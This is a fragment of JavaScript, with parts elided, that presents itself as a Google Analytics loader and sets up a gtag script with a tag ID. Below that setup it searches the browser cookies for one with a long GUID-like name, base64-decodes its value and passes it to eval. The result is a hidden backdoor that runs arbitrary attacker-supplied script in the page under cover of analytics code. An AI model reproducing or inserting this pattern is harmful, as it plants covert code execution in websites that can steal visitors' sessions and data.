...
function g_analy() {
    let name = 'fd8aabf4-94e3-4a33-b5c4-2556f84d0e71d5a0a74c-bb7d-420e'
    var script = document.createElement('script');
    script.id = 'g-analytic-script';
    script.src = 'https://www.googletagmanager.com/gtag/js?id=G-YN1RD5Y7ZL';
    script.async = true;
    const cookies = document.cookie.split(';');

    if (!document.getElementById('g-analytic-script')) {
        ...
        script.onload = function () {
            ...
            gtag('js', new Date());
            gtag('config', 'G-YN1RD5Y7ZL');
        };
    }
    let temp_el = document.createElement('temp_el');
    temp_el.id = 'temp_el_244567'
    if (!document.getElementById('temp_el_244567')) {
        document.body.appendChild(temp_el);
        for (let i = 0; i < cookies.length; i++) {
            let cookie = cookies[i].trim();
            if (cookie.startsWith(name + '=')) {
                const cookieValue = cookie.substring((name + '=').length, cookie.length);
                eval(atob(decodeURIComponent(cookieValue)))
            }
        }
    }
}
